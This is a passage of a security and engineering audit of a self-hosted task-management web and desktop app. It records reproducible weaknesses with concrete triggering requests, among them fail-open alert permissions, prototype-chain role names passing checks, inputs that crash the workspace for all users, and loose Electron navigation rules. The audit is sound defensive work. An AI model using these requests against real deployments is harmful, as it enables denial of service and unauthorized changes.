- **Evidence.** Starting `node …/dist-desktop/app.mjs` from another directory: `GET /` → **404**, and a new empty `data/atlas-store.json` was created under that directory, exposing a fresh, open first-run setup while the real store sat untouched elsewhere.
- **Impact.** After a redeploy/reboot the service may "lose" its data and expose setup (SEC-01).
- **Recommendation.** Resolve paths relative to the bundle (`import.meta.url`) for assets; require `ATLAS_DATA_DIR` in production (fail fast if missing); document systemd/pm2 examples.

---

### 3.3 Input validation and API contract (VAL)

#### VAL-01 — No server-side validation lets one bad value brick the application for everyone · **P1** · ✅ Reproduced

- **Issue.** Handlers use `req.body.x || default` / `?? previous` with no type, format, enum or length checks. Several values are later fed to APIs that throw.
- **Evidence.** (1) A Developer `POST /api/tasks {dueDate:"not-a-date"}` → **500**, yet the task is already persisted; afterwards `GET /api/bootstrap` → **500 for Admin, Manager and Viewer** (`Intl.DateTimeFormat.format(Invalid Date)`). (2) An admin typing `Europe/Amsterdm` in the free-text *Timezone* field → every data route (`/api/bootstrap`, reports, `POST /api/tasks`) → 500 (`RangeError: Invalid time zone`); the UI cannot load Settings to repair it. (3) `PUT /api/users/:id {email:12345}` → later user creation and any login that reaches that record → 500. (4) Role names from the prototype chain (`constructor`, `toString`, `__proto__`) pass the "Unknown role" check.
- **Impact.** Any low-privilege writer — or one typo by an admin — causes a workspace-wide outage whose only fix is editing JSON by hand. In the UI it appears as an *empty* workspace with a generic "Request failed (500)" (UX-04), which looks like data loss.
- **Recommendation.** Introduce schema validation (zod/valibot/ajv) for every request body and for stored settings: ISO dates, `Intl.supportedValuesOf('timeZone')`, enums for status/priority/type/roles (own-property check), string lengths, numeric ranges, reference existence. Make presenters defensive (never throw on bad stored data), add a global JSON error handler, and a "safe mode" that loads with defaults when settings are invalid.

#### VAL-02 – VAL-05 (P2)

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **VAL-02** | **Inconsistent update semantics** (✅). `PUT /api/tasks/:id` uses `blocked: Boolean(req.body.blocked)` — omitting `blocked` clears it (renaming a blocked task unblocked it). `PUT` accepts any `status` string (e.g. "Totally Made Up Status") while `PATCH …/status` validates. Priority/type/colour/tone are free text; `capacity` is not clamped (UI bar overflows); `parseNumber(null)` → 0. | Silent data changes by API clients/integrations; bypass of configured workflow; layout breakage. | P2 | `PATCH` semantics with explicit "present" checks; one validated transition function used by both routes; enums + ranges. |
| **VAL-03** | **API contract defects** (✅). Unknown routes and unsupported methods return **200 + the SPA HTML** (including the *documented* but non-existent `PUT /api/alerts/:id`, `PATCH /api/alerts/:id/resolve`); malformed JSON → 400 HTML; 413 → HTML; invalid report period silently becomes `weekly`; unknown `userId` → 200 "Selected user"; no pagination, filtering, versioning or OpenAPI; `/api/bootstrap` is a monolith. | Clients mistake HTML for success; hard-to-debug integrations; unbounded payloads (UX-01, ARCH-01). | P2 | `/api/*` 404 handler returning JSON before the SPA fallback; JSON error middleware; 400 on invalid enums; paginated, filterable list endpoints; publish an OpenAPI spec and test the docs against it. |
| **VAL-04** | **Authorization checks that fail open** (✅). `PATCH /api/alerts/:id` with an empty body (or `resolved` not boolean) skips both permission checks; a Viewer got `200` and created an audit entry. | Unprivileged writes/noise; sign of ad-hoc auth logic. | P2 | Express the permission in the route middleware (`requireAnyPermission`), not in body inspection. |
| **VAL-05** | **Workflow configuration is not enforced** (🔍/✅). `transitions`, `approvalSteps`, `automatedActions` are stored and never evaluated: `PATCH` allowed `To do → Done` directly. UI logic is keyed to English names (`status === 'Done'` icon, CSS classes from `slug(status)`); client `slug()` maps every non-Latin state name to `-` (verified: `slug("قيد التنفيذ")` → `"-"`), so an Arabic workflow gets identical ids/classes for all states. | Admin believes approvals/transition rules exist; localized workflows render and key incorrectly. | P2 | Enforce `from → to` + permission server-side (or remove the UI), key everything by state `id` (generate with `crypto.randomUUID`/Unicode-safe slug), drive icons/terminal flags from `terminal`. |

---

### 3.4 Reporting and analytics correctness (REP)

#### REP-01 — "Delivery rate" is a flow ratio that can exceed 100 % and the charts assume it can't · **P1** · ✅ Reproduced

- **Issue.** Per bucket, *planned* = tasks **created** in the bucket and *completed* = tasks **completed** in the bucket (regardless of when created); `rate = completed / planned`, uncapped. The Reports page then draws bars as `max(rate, 3–8) %` on a 0–100 % axis, overlays a "planned" line of `planned × 12 %`, and shows the raw `deliveryRate` over "/100". An empty workspace shows "Needs focus".
- **Evidence.** One task created today plus five old tasks completed today → bucket `{completed:5, planned:1, rate:500}`.
- **Impact.** The headline KPI is conceptually wrong (not "delivered vs committed"), regularly > 100 %, and visually broken; leaders may act on it.
- **Recommendation.** Define the metric (e.g. completed on/before due date ÷ due in period, or throughput vs. intake as two separate series), cap or reframe, scale charts by data, and document definitions in the UI.

#### REP-02 — Reports are computed from mutable current state, and there are two disagreeing sources of truth · **P1** · ✅ Reproduced

- **Issue.** The general report derives from `task.createdAt/completedAt`; reopening a task clears `completedAt`, deleting a task removes it — so *past periods change*. The activity report derives from `workLogs`, which keep events for deleted tasks (relabelled "Daily update").
- **Evidence.** Completed-today 8 → 7 after reopening a task; planned 9/completed 7 after deleting one; the ledger kept rows for the deleted task.
- **Impact.** Last month's numbers are not reproducible; the two reports can contradict each other for the same period.
- **Recommendation.** Record immutable events (created, assigned, moved, completed, reopened, deleted) and derive all reports from them (or from periodic snapshots); soft-delete tasks.

#### REP-03 — Activity metrics and several dashboard widgets are heuristic or mislabelled · **P2** · ✅ Reproduced

| Issue | Evidence | Impact | Pri | Recommendation |
|---|---|---|---|---|
| "Blockers" = any ledger row whose *summary text* contains "blocked". | A task titled "Investigate blocked queue…" (not blocked) counted as 1 blocker. | False positives in a headline KPI. | P2 | Count tasks with `blocked:true` / blocker events. |
| `completedTasks` counts events, not tasks. | One task completed 4 times → completed 4 vs touched 3. | Inflated counts, "completed > touched". | P2 | Count distinct task ids per period (or final-state). |
| "Most active this week" = the first 4 people in directory order with all-time update counts; "Yesterday" tab = *all* older entries; "Upcoming milestones" = first 8 in project order (not sorted/filtered); "Daily" activity window is 10 days (code slices −14 of 10 buckets); project-contribution bar = `min(100, completed × 18)`; role badge defaults to "Developer" for people without accounts; "Capacity" is a static manual % unrelated to assigned work. | Observed in the running client / API; the contribution bar, role badge default and "Capacity" semantics from code. | Decorative or wrong numbers presented as analytics. | P2 | Compute from data (rank, filter, sort), or relabel/remove. |
| Weeks always start Monday and ignore `workingDays`/locale; default timezone `America/Los_Angeles`, helper names `todayLA`/`timeLA`, server dates formatted `en-US` for every language; Persian calendar and Arabic-Indic digits (settings exist) not implemented. | Code. | Wrong period boundaries for he/ar/fa locales (Sunday/Saturday weeks); English dates in Arabic UI. | P2 | Locale-aware week start, per-user locale/timezone, format dates on the client from ISO values. |

---

### 3.5 Frontend, UX, internationalisation and accessibility (UX)

#### UX-01 — Board, list and exports silently truncate to the page size · **P1** · ✅ Reproduced (client executed in jsdom)

- **Issue.** `MyWork` applies `.slice(0, settings.pageSize)` (default 50) *after* filtering/sorting and offers no pagination, "show more" or "showing 50 of N". Because the default sort is due date ascending, the **latest-due (most future) tasks are the ones hidden**. The Export panel is fed the same sliced array.
- **Evidence.** Demo data (54 tasks): the board rendered **50 cards**, the header said "*50 visible tasks*", and the four hidden tasks included open, high-priority work ("Add pipeline freshness alert", "Create annual executive delivery pack"). The Export panel reported **Rows = 50**.
- **Impact.** Teams with more than 50 tasks cannot see — or export — all their work, and nothing tells them so. This is a data-visibility bug in the core screen.
- **Recommendation.** Server-side pagination/filtering with explicit counts; virtualised list or per-column paging on the board; exports must run on the full filtered set (server-side), with a visible row count; treat `pageSize` as a table-view setting only.

#### UX-02 — "My work", the sidebar counter and "My focus" are not the user's work · **P1** · ✅ Reproduced

- **Issue.** `MyWork` lists all tasks; the sidebar badge is the workspace-wide open-task count (`dashboard.stats.openTasks`); `dashboard.myTasks` is the first six open tasks by due date — i.e. the oldest overdue ones. There is no "assigned to me" filter.
- **Evidence.** Signed in as Maya (2 open tasks assigned): the badge showed **23**; "My focus" listed five "Historical delivery item …" tasks, **0 of 5** hers.
- **Impact.** The primary personal workflow is mislabelled and misleading; developers must search for their own work.
- **Recommendation.** Default filter `assigneeId = me` with an "everyone" toggle; compute counts per user server-side; sort "My focus" by due/priority among *my* open tasks.

#### UX-03 — Internationalisation is implemented by rewriting DOM text, which changes user data and is expensive · **P1** · ✅ Reproduced

- **Issue.** A `MutationObserver` on `document.body` walks **every text node and `placeholder`/`title`/`aria-label` attribute** after each DOM change and rewrites it using phrase tables plus substring replacement (for phrases > 10 chars). `data-no-i18n` exists but is applied only to the translation-admin screen — the app's own docs say user-entered values must not be translated. There are three separate catalogs (server defaults: 12 keys; client built-in: 440 phrases; stored copies), the language is workspace-wide (`userLanguagePreference` is described as "future"), dates/numbers are formatted server-side as `en-US`, export labels and titles are English literals, and RTL support relies on 18 hand-written `html[dir="rtl"]` overrides next to dozens of physical-direction declarations (e.g. 30 `left:`, 14 `right:`, 18 `margin-left`, 10 `text-align:left`) and almost no logical properties.
- **Evidence.** English UI: a user task titled **`المشاريع`** is *displayed* as "**Projects**". Arabic UI: user-authored titles "Review", "Settings", "Search anything" display as "مراجعة", "الإعدادات", "البحث في كل شيء", and the project the user named "Reports" displays as "التقارير". Coverage: 384 of 468 distinct static JSX strings (≈ 82 %) match the catalog; 81 of 440 phrases per language are identical to English; server strings ("Today", "3d late", "Week of …") are untranslated. Cost (jsdom, indicative): ≈ 175 ms per pass in English and ≈ 0.9 s in Arabic for a 3,000-text-node page, re-run on every mutation (rAF-throttled). Non-Latin export titles produce the file name `-.csv`.
- **Impact.** What users see is not what is stored/searched/exported; search, filters and exports disagree with the screen; multilingual teams can't each use their own language; large lists jank; "full translation coverage" is overstated.
- **Recommendation.** Replace with explicit message catalogs (FormatJS/i18next, ICU plurals) rendered through `t()`/`<FormattedMessage>`; never touch data-bound nodes; per-user locale; send ISO values from the server and format with `Intl` on the client; adopt logical CSS properties; Unicode-safe slug/filename helper; native-speaker review and a pseudo-localisation check in CI. Short-term mitigation: whitelist chrome only (or add `data-no-i18n` to every data-bound element).

#### UX-07 — A large part of the Settings console configures nothing (false assurance) · **P1** · ✅ Reproduced

- **Issue.** At least **27** settings keys appear exactly once in the server (their default declaration) and are never read: `notifications`, `integrations.webhooks`, `integrations.apiAccess`, `workflows.task.{approvalSteps,automatedActions}`, `workspace.{workingDays,workingHours,holidays}`, `permissions.{moduleAccess,fieldAccess,actionAccess,exportPermissions,reportingPermissions}`, `security.{sessionDays,passwordMinLength,requireApprovalForRoleChanges}`, `audit.{trackReads,trackWrites,trackExports}`, `localization.{userLanguagePreference,numberFormats,currencyFormats,timezoneFormats}`, `storage.importExportEnabled`, `reports.{customColumns,customFilters,customCalculations}`. On the client, `interface.{tableColumns,formLayouts,actionVisibility,typography,spacing}`, `exports.*` and `workspace.logo` are stored but unused; "Backup retention" and "Storage model" are editable fields while the server uses an env var. Some descriptions admit it ("*metadata*", "*future*"); most security-related ones do not.
- **Side effects measured.** The client re-sends its whole merged settings object, so the first save by an admin (even the topbar theme toggle) freezes the built-in translation catalog into the store: store **18 KB → 133 KB**, bootstrap payload **12 KB → 93 KB** for every user on every refresh; stored phrases then override later built-in improvements. The theme toggle by an admin changes the theme **for everyone**; for non-admins it is silently reverted by the next data refresh.
- **Impact.** An administrator who sets "Password minimum length 12", "Session duration 1 day", "Track exports" or a field ACL believes a control is active when it is not. Scope creep in the schema also multiplies maintenance and test surface.
- **Recommendation.** Mark every setting as *enforced / planned / removed*; remove or hide inert ones; for security-relevant ones either implement or show "not enforced". Send only changed paths (`PATCH`), never persist defaults; separate per-user preferences (theme, language, density) from workspace policy.

#### UX-04 – UX-06, UX-08, UX-09 (P2)

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **UX-04** | **Error handling gaps** (✅/🔍). No error boundary and no global handlers. Delete, drag-drop, alert-resolve, settings-save and backup actions don't catch failures. A mid-session `401` isn't routed to login. | Deleting your own account (server: 400 "cannot delete your own account") shows **nothing** and becomes an unhandled rejection; with a poisoned record (VAL-01) the user sees an *empty* workspace with a generic "Request failed (500)". Any render error blanks the page. | P2 | Central `api` wrapper with typed errors and toasts; redirect to login on 401; React error boundary; surface server messages; show "failed to load" instead of an empty shell. |
| **UX-05** | **Accessibility** (🔍). Only 5 `aria-label`s (icon-only buttons are unnamed); no `role="dialog"`/`aria-modal`/focus trap for modals and the command palette; no `aria-live` for toasts; clickable `div`/`article` rows aren't focusable; drag-and-drop is mouse-only (HTML5 DnD doesn't work on touch); no `prefers-reduced-motion`/`prefers-contrast` (only an admin-wide toggle); 9 `outline:none/0` rules; `⌘K` hint shown on all OS. | WCAG 2.x failures; unusable for keyboard/screen-reader/touch users; legal exposure for public-sector or enterprise buyers. | P2 | Adopt an accessible primitive library (Radix/React Aria), label icon buttons, keyboard DnD alternative (menu "Move to…"), live regions, honour OS preferences, run axe in CI, decide a WCAG 2.2 AA target. |
| **UX-06** | **Accidental changes / destructive actions** (✅/🔍). Clicking anywhere on a board card advances its status (reproduced: one plain click moved a task *To do → In progress* and logged a 45-minute "Moved task" event — DATA-04); deletes use `window.confirm("Delete this record?")` even when cascading (project → all its tasks and milestones); no undo or soft delete; modals close on backdrop mouse-down/Esc and discard input. | Easy mis-clicks change workflow state; irreversible data loss. | P2 | Explicit "advance" control; descriptive confirms with counts; soft-delete + undo toast; confirm-on-dirty for modals. |
| **UX-08** | **Collaboration and navigation gaps** (✅/🔍). State is in memory only: no URLs/deep links, browser Back and refresh lose context; no polling/SSE (the "Live" labels are static); no optimistic concurrency (last write wins silently); custom-field values are collected but never shown, filtered or exported; alerts are manual only and notifications are never sent; "Invite person" only creates a profile; the sidebar workspace switcher is an inert `div`; the Electron menu item "Reports → Open Reports" dispatches `atlas:navigate`, which nothing listens to. | Users work on stale data and overwrite each other; features that look present are not. | P2 | Router with URLs; SSE/polling + ETag/`If-Match` on updates; surface or drop custom fields; real alert rules/notifications or remove the claims; remove inert controls. |
| **UX-09** | **Query-builder semantics** (🔍/✅). Conditions fold strictly left-to-right (no AND-before-OR precedence, no grouping); `>`/`<`/`≥`/`≤` use `Number()` so they never match ISO dates, and the only date-like filter fields are labels ("Tomorrow", "3d late"); empty-value conditions are ignored; filters persist in `localStorage` keyed only by page (shared by every user of the browser, not cleared on logout). | Wrong result sets and no way to express the most common ops query ("due before X"); cross-user leakage on shared machines. | P2 | Real expression tree with grouping, typed fields (date/number/enum), scope filters per user/workspace and clear on logout. |

---

### 3.6 Architecture, performance and maintainability (ARCH)

#### ARCH-01 — Scalability cliffs from synchronous whole-file persistence, full-payload bootstrap and O(n²) reports · **P2** (P1 if the target is > 10k tasks) · ✅ Reproduced

- **Issue.** Every mutation `JSON.stringify`s and rewrites the entire store (audit log and work logs included) synchronously; `/api/bootstrap` ships everything; per-row lookups use `Array.find` (people/projects/tasks), making `activityReportFor` O(rows × entities); admins also trigger `/api/system` (SHA-256 over the whole store) after every refresh; no compression or caching headers.
- **Evidence (synthetic stores, production bundle, single client).**

| Tasks | Store | Bootstrap (payload) | Create task | All-users monthly activity report | `/api/health` while a bootstrap runs |
|---|---|---|---|---|---|
| 1,000 | 0.4 MB | 77 ms (0.4 MB) | 8 ms | 126 ms | 52 ms |
| 10,000 | 4.3 MB | 708 ms (3.6 MB) | 35 ms | **2.9 s** | 587 ms |
| 50,000 | 21.6 MB | 3.7 s (17.9 MB) | 212 ms | **43 s** | not measured |

  The shipped "realistic volume" test used 160 tasks. Because Node is single-threaded and the handlers are synchronous, one slow request stalls every other user.
- **Impact.** A team creating ~30 tasks/day reaches the multi-second range within a year; any `viewReports` user (including Viewers) can freeze the server by requesting the all-users report on a large store.
- **Recommendation.** Move to SQLite (WAL) with indexes and incremental writes; paginate and filter on the server; pre-aggregate/cache reports; build `Map` indexes if staying in memory; gzip; cap report row counts; move heavy work to a worker thread; load-test at 10×.

#### ARCH-02 — Architectural choices don't match the stated goals · **P2** · 🔍 Code-confirmed ❓

- **Issue.** (a) "Local-first" is claimed but the app is a client–server system with no offline data or sync. (b) A JSON file store with a single in-memory writer suits one user on one machine, not "organisation-wide" reporting. (c) Electron hosts the Express server *inside the main process* on a TCP loopback port, so synchronous scrypt/JSON writes freeze windows and menus, and any local process/browser can reach the API. (d) A PWA/service worker over a loopback desktop app has no clear purpose.
- **Impact.** Each choice is defensible for a prototype, but together they cap scale, complicate security (SEC-01/02/10) and make the claims inaccurate.
- **Recommendation.** Decide the target: **(A) personal/small-team desktop** — keep the file store but add locking, durability and single-instance, run the server in a utility process on a random port with a per-launch token or switch to IPC; **(B) team server** — SQLite/Postgres, sessions in DB, TLS, SSO, proper RBAC. Rename "local-first" to "self-hosted" unless true offline/sync is built.

#### ARCH-03 — Maintainability and type safety · **P2** · ✅ Reproduced

- **Issue.** Server logic is one 1,122-line file; the client is one 848-line file with 66 lines over 500 chars, 19 over 2,000 and one 88 KB line (phrase tables) and ~70 components; defaults and helpers are duplicated and already diverge (`defaultSettings` ×2 — e.g. server pre-populates workflow `transitions`, client doesn't; `ROLE_*` ×2; `mergeDeep` ×2; translation catalogs ×3). There is no linter/formatter. The `.tsx` files are untyped JavaScript: the project ships **no `typescript` or `@types/*` dependency and no `typecheck` script**; checking with the repo's own `tsconfig` (`strict:false`) — after installing the type packages it does not ship — yields **432 errors** (386 × TS2339), and **1,410** with `--strict`.
- **Impact.** Reviews, merges and onboarding are painful; refactors are unsafe; many defects in this report (undefined access, wrong shapes) are exactly what a type-check would catch.
- **Recommendation.** Split server (routes/services/store/auth/reports) and client (features/components/i18n) into modules; share types/schemas between them (zod); add ESLint + Prettier + `tsc --noEmit` in CI and ratchet strictness; format the dense files once.

---

### 3.7 Desktop, packaging and PWA (DESK)

#### DESK-01 — No single-instance lock: launching the app twice loses data · **P1** · ✅ Reproduced (two server processes)

- **Issue.** `electron/main.cjs` never calls `app.requestSingleInstanceLock()`; each launch starts its own server on the next free port (5173, 5174, …) over the *same* `userData/data/atlas-store.json`, each with independent in-memory state.
- **Evidence.** Two server instances on one data dir: a record created in instance A was overwritten by instance B's next write.
- **Impact.** Double-clicking the icon twice (or the OS restoring sessions) produces silent lost updates.
- **Recommendation.** Single-instance lock + focus existing window; file lock in the store layer (DATA-02).

#### DESK-04 — Desktop distribution is unverified and incomplete · **P1** · ⚠️ Risk

- **Issue.** `package.json` references `build/icon.ico` and `build/icon.png` (and the docs list them), but **no `build/` directory is in the repository**; the acceptance report states the packaged app was never launched (missing `libnspr4.so`) and I could not download Electron here either, so packaging from a clean clone is unproven. There is no code signing/notarisation, no auto-update, no crash reporting; `appId` is `ai.arena.atlasworkspace` (placeholder identity — changing it later breaks upgrade continuity); the package ships `docs/**` and a duplicate `public/**`; `asar` + ESM `import()` of the server bundle from inside the archive is untested.
- **Impact.** The first real installer may fail to build, run, or be blocked by SmartScreen/Gatekeeper; the release cannot be patched remotely.
- **Recommendation.** Commit the icon assets; add a CI job that builds and **launches** the package (xvfb + smoke test) per OS; configure signing/notarisation; choose the final `appId`; exclude docs; add an update channel (electron-updater) or document manual updates.

#### DESK-02, DESK-03, DESK-05 (P2)

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **DESK-02** | **Window and navigation hardening** (🔍). `sandbox:false`; no `will-navigate`/`will-redirect` guard; `setWindowOpenHandler` allows any URL that merely *starts with* `http://127.0.0.1:<port>` (so `…:51730` matches `…:5173`) and passes every other URL, any scheme, to `shell.openExternal`; no permission-request handler; the preload exposes `process.versions`; DevTools in the production menu; predictable port (first free from 5173) with a probe/close/listen race; the `Host` header is never validated. | A compromised or rebinding page can reach a privileged window/API; `openExternal` with `file:`/custom schemes is a known abuse path. | P2 | `sandbox:true`, strict navigation allow-list, `https:`/`mailto:` only for `openExternal`, `setPermissionRequestHandler(deny)`, remove DevTools in production, random port + per-launch token/Host check, minimal preload. |
| **DESK-03** | **Native UX defects** (🔍/✅). The custom menu replaces Electron's defaults and contains no Edit roles, so Cut/Copy/Paste/Select-All shortcuts don't work on macOS; "Reports → Open Reports" fires an event nobody handles; "Print" prints the whole window instead of the report template flow; no standard macOS app menu (About/Hide/Quit roles). | Broken basic editing on macOS; dead menu entries. | P2 | Use `Menu.getApplicationMenu()` defaults or add `role: editMenu/appMenu/windowMenu`; wire or remove custom items. |
| **DESK-05** | **PWA / offline claims are not met** (✅ simulated). The worker precaches only the manifest, icon and fonts; it never caches `/` or the JS/CSS bundles at install, so offline navigation resolves to `undefined`; manifest and icon are cache-first without versioning (manual cache-name bumps v3 → v5 in the docs); the manifest has a single SVG icon marked `any maskable`; the worker also registers in dev. All data needs the server anyway. | "Offline shell" / "installable PWA" are marketing-only; stale-asset risk after upgrades. | P2 | Either remove the worker and manifest, or implement a real strategy (precache build assets via `vite-plugin-pwa`, versioned cache, offline page, PNG 192/512 + maskable icon). |

---

### 3.8 Dependencies, build and repository (BUILD)

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **BUILD-01** | **Unpinned dependencies and runtime mismatch** (✅). Nine dependencies use the `latest` tag (`express`, `cookie-parser`, `react`, `react-dom`, `vite`, `@vitejs/plugin-react`, `jspdf`, `jspdf-autotable`, `fflate`) — reproducible only through the lockfile and `npm ci`, while all docs say `npm install`; README calls Electron "pinned" but it is `^44.5.1`; `engines: node >=22.12` but the acceptance report validated on Node 20.20.2 (I re-ran on 22.22.3: 23/23 pass); no `.nvmrc`/`engine-strict`; no Dependabot/Renovate; deprecated transitive packages (`rimraf@2`, `glob@7`, `inflight`, `boolean`). | An `npm install` after any lock change can pull a new major (Express/React/Vite) and break the build; Electron falls out of its support window quickly. | P2 | Pin exact/caret ranges, use `npm ci` in docs and CI, `.nvmrc` + `engine-strict`, automated update PRs, an Electron upgrade cadence. |
| **BUILD-02** | **Dev/prod parity and build hygiene** (✅). `workspaceTimezone()` reads `store` (declared with `let` ~370 lines later) via `typeof store`, which throws in the temporal dead zone under native ESM — `ATLAS_ALLOW_DEMO_DATA=true npm run reset:data` (the documented dev command) crashes with `ReferenceError: Cannot access 'store' before initialization`, while the esbuild bundle hoists the binding and masks it; the same path would crash dev start-up when migrating a store that has tasks but no work logs. `dist-desktop/app.mjs` is a committed build artifact (identical today, but drift-prone); `docs/final-validation-results.json` is a tracked file rewritten by every test run; `npm run start` doesn't build and `dist/` is git-ignored; three script aliases (`app`/`web`/`dev`); `final-validation.mjs` hard-codes `/tmp` and `rm -rf`s `TEST_DATA_DIR`. | Documented commands fail; dev and prod behave differently; dirty working trees after tests. | P2 | Initialise `store` before any use (or pass it explicitly); remove `dist-desktop/` from git; write test artefacts to `tmp/`; add `npm test`, `npm run typecheck`, `npm run lint`; test both tsx and bundle paths. |
| **BUILD-03** | **Repository hygiene and licensing** (✅). No `LICENSE`/`NOTICE`; no `license`/`repository` fields; the "Atlas Sans/Display" fonts are **DejaVu Sans** (Bitstream Vera licence) renamed, two of the three files are byte-identical (709 KB each), TTF not WOFF2 (2.2 MB, all precached); single commit; no CONTRIBUTING/CODEOWNERS/templates/`.editorconfig`; some CSS is unreferenced (e.g. `.upgrade-card`, `.desktop-mode-bar`). | Unclear legal status for users/contributors; third-party licence notices missing; wasted bytes. | P3 | Add LICENSE + THIRD_PARTY_NOTICES (DejaVu, Electron/Chromium); dedupe and subset/convert fonts; prune dead CSS; add contributor docs. |

---

### 3.9 Testing, quality assurance and process (QA)

#### QA-01 — There are no real quality gates, and "final acceptance" did not test the failure modes · **P1** · ✅ Reproduced

- **Issue.** No unit, integration, E2E, accessibility or security tests; no CI configuration; the only check is `scripts/final-validation.mjs` — 23 happy-path API assertions, not wired to `npm test`. It never calls `/api/setup` after configuration, never hits an unauthenticated mutation, sends no invalid input, doesn't verify report arithmetic, and doesn't touch the UI (the report admits "no browser automation engine is available"). Pure functions (`bucketFor`, `reportFor`, `normalizeSettings`) have no tests. Types are not checked (ARCH-03).
- **Evidence.** I reproduced 23/23 passing on the build that exhibits every P0 in this report; the script also overwrites a tracked docs file on each run.
- **Impact.** The project can claim "0 failures" while shipping takeover and data-loss defects; regressions will go unnoticed.
- **Recommendation.** Add Vitest for pure logic (reports, merge/normalise, validators), `supertest`-style API tests per role including negative/abuse cases, Playwright E2E (setup, task move, export), axe-core a11y checks, `tsc --noEmit` and ESLint in a CI workflow, and make the acceptance script adversarial (security regression suite for SEC-01…09).

#### QA-02 — Acceptance process and metrics · **P2** · 🔍 Code-confirmed

- **Issue.** The report declares the web runtime "ready for operational use" while listing unexecuted checks (GUI launch, exports/print); `final-validation-results.json` records `knownLimitations: []` while the report lists three; the performance check used 160 tasks and one client; validation ran on a Node version different from the declared one.
- **Impact.** Release confidence is overstated.
- **Recommendation.** Define acceptance criteria up front (security, scale targets, a11y level), record limitations in one place, test on the declared runtime and at 10× the expected volume.

---

### 3.10 Documentation (DOC)

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **DOC-01** | **Documentation contradicts the code in many places** (✅) — see the claims audit in §2 (20 items): non-existent routes, `projectRows`, `designSystemVersion` "1.0.0" vs 2.0.0 in code, `build/icon.*`, "template selection", "pinned" Electron, demo-data command, "restore works", "Production-safe mode" banner, the Developer role described as "task progress" only, and `removeDemoData` documented as required although the server only checks `manageSettings`. Runbook advises `ATLAS_HOST=0.0.0.0` without mentioning SEC-01. | Operators follow docs into unsafe or broken states. | P2 | Treat docs as tested artefacts: generate the API reference from an OpenAPI spec, link-check, run documented commands in CI; add a security section that matches reality. |
| **DOC-02** | **Volume and structure** (🔍). 16 docs + README + PRODUCTION.md (≈ 3,900 lines) mix reference docs with dated status reports (`UI_REFINEMENT_REPORT`, `FIELD_ENTRY_CONFIGURATION_FIX`, `FINAL_ACCEPTANCE_REPORT`), duplicate the same lists (links appear in README, PRODUCTION and docs/README), and have no CHANGELOG, ADRs, architecture diagram, threat model or contribution guide. | Drift is guaranteed; readers can't tell current from historical. | P3 | Keep ~5 living docs (README, Operations, API, Architecture/ADR, Security), move status reports to a `CHANGELOG`/release notes, add a threat model. |

---

### 3.11 Product scope, governance, legal and compliance (GOV)

#### GOV-01 — There is no brief, requirement set or non-goals, and the product position is unstable · **P1** · ❓ Clarify

- **Issue.** No personas, jobs-to-be-done, deployment model, scale target, success metrics, SLOs or non-goals are stated; the docs alternately describe a personal desktop tool, a team server and an extensible platform. "Engineering operations" lacks engineering-specific capability (VCS/CI links, estimates, sprints, dependencies, comments, attachments, import). The configuration surface (UX-07) is far larger than the delivered behaviour.
- **Impact.** Priorities for security, data model and scale cannot be set rationally; effort goes into configuration breadth instead of correctness and adoption.
- **Recommendation.** Write a one-page brief: target user and deployment (A or B in ARCH-02), data volume, security level, compliance, "must/should/won't"; cut the schema to what is enforced; plan integrations/imports that drive adoption.

#### GOV-02 — Per-person activity analytics raise privacy, labour-law and fairness questions · **P1** · ❓ Clarify

- **Issue.** Any role (including Viewer) can see who did what, when, with "minutes", for any individual; there is no notice, purpose limitation, role-limited view, retention policy for `workLogs` (only audit logs expire), data-subject export/erasure, or consideration of jurisdictions with employee-monitoring rules. Emails are also persisted in audit details. The underlying numbers are constants (DATA-04).
- **Impact.** Potential non-compliance (e.g. GDPR transparency/lawful basis and employee-data rules, works-council co-determination in some countries), reputational harm, and unfair decisions based on unreliable metrics.
- **Recommendation.** Decide the lawful purpose; restrict per-person views to the person and their managers; default to team aggregates; define retention and an erasure/export procedure; add a visible transparency notice; run a DPIA before real deployment.

#### GOV-03 and GOV-04 (P2/P3)

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **GOV-03** | **Identity scope** (❓). No SSO (OIDC/SAML), MFA, SCIM or email invitations; "people" and "users" are separate records without an enforced 1:1 link; no per-user preferences. (The demo data's own task list says "Resolve SSO callback mismatch".) | Blocks organisational adoption; account lifecycle is manual and error-prone. | P2 | Decide the identity roadmap (OIDC first), invitation tokens instead of admin-set passwords, enforce user↔person linking. |
| **GOV-04** | **Ownership, naming and licensing placeholders** (❓). `appId ai.arena.atlasworkspace`, author "Atlas Workspace Team", no LICENSE/NOTICE, generic product name "Atlas" (many existing products). | Identity/ownership ambiguity, potential naming conflicts, unclear redistribution rights. | P3 | Set the real organisation identifiers, pick a licence, run a trademark/name check. |

---

### 3.12 Minor observations (P3)

| ID | Issue (tag) | Impact | Pri | Recommendation |
|---|---|---|---|---|
| **MIN-01** | `/api/health` hard-codes `version:"1.0.0"` and `desktopReady:true`, and reports `ok:true` regardless of store writability or integrity (✅). | False-green monitoring (see DATA-02). | P3 | Read the version from `package.json`; split liveness/readiness; include last successful save and integrity summary. |
| **MIN-02** | Static delivery (✅): no compression; hashed `/assets/*` are served `Cache-Control: public, max-age=0` (revalidated on every load); `X-Powered-By: Express` is sent. | Slower loads over a network; fingerprinting. | P3 | `compression`, `immutable` long-cache for hashed assets, `app.disable('x-powered-by')`. |
| **MIN-03** | PDF export (✅ observed in a Node reproduction): autoTable header cells request **bold** but only the Regular font is registered, so jsPDF warns and falls back (header typography/glyph coverage differs from the body); a 760 KB TTF is fetched and base64-encoded on every export; the lazy PDF chunk (~0.8 MB) includes unused html2canvas/DOMPurify; font-load errors are swallowed (`catch {}`). Arabic title and body cells *are* shaped correctly (verified by extracting the PDF text); only the fallback-font header cells are affected. | Inconsistent output, wasted bytes, silent degradation. | P3 | Register Bold, cache the font, tree-shake/avoid `html()` features, surface font failures. |
| **MIN-04** | Public information surface (✅): unauthenticated `/api/runtime-config` returns the (relative) data-file path and backup settings; `/api/i18n/catalog` is public. | Minor reconnaissance value. | P3 | Return only what the login/setup screens need. |
